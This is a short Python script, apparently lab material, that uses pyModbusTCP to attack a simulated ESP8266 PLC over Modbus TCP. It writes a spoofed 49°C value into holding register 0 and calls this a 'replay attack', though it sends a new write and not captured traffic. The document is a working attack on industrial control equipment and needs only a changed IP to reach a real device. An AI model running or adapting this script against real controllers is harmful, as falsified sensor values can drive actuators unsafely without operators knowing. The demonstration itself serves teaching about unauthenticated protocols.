from pyModbusTCP.client import ModbusClient

"""
===========================================================
Replay Attack – Modbus TCP (Write Single Register)
===========================================================

Description:
This script demonstrates a Modbus TCP Replay Attack against
a simulated PLC (ESP8266). The attack consists of replaying
a previously captured legitimate Modbus Write command in order
to show that the PLC accepts the same command multiple times
without any authentication or replay protection.

Attack Type:
- Replay Attack
- Targets: Integrity and Safety

Impact:
- The PLC accepts an old Modbus Write command as valid
- Control logic is triggered based on outdated data
- Actuator behavior is affected without operator awareness

Protocol Details:
- Protocol: Modbus TCP
- Function Code: 06 (Write Single Register)
- Target Register: Holding Register 0
- Injected Value: 49°C

This vulnerability exists due to the absence of authentication,
timestamps, nonces, and session verification in the Modbus TCP
protocol.
"""

# -----------------------------------------------------------
# PLC Network Configuration
# -----------------------------------------------------------

PLC_IP = "192.168.1.137"      # IP address of the target PLC (ESP8266)
MODBUS_PORT = 502             # Standard Modbus TCP port

# -----------------------------------------------------------
# Modbus Client Initialization
# -----------------------------------------------------------

client = ModbusClient(
    host=PLC_IP,
    port=MODBUS_PORT,
    unit_id=1,
    auto_open=True
)

# -----------------------------------------------------------
# Replay Attack Execution
# -----------------------------------------------------------

print("[*] Replay attack started")

# Replay of a previously captured Modbus Write Single Register command
# This command overwrites Holding Register 0 with a high temperature value
success = client.write_single_register(0, 49)

if success:
    print("[+] Replay successful: Holding Register 0 overwritten with 49°C")
else:
    print("[-] Replay failed: PLC did not accept the command")

# -----------------------------------------------------------
# Close Connection
# -----------------------------------------------------------

client.close()
